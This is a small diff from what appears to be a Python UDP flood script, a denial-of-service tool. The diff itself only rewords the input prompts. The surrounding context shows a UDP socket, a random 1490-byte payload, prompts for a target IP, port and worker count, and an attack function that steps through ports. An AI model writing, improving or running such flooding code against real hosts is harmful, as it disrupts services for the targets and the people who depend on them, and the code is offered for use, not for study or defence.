@@ -8,9 +8,9 @@ import threading
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 payload = random._urandom(1490)
 
-ip = input("IP Target  : ")
-port = int(input("Port       : "))
-n = int(input("times      : "))
+ip = input("IP Target        : ")
+port = int(input("Port             : "))
+n = int(input("How many workers : "))
 
 def attack(ip, start_port):
     current_port = start_port
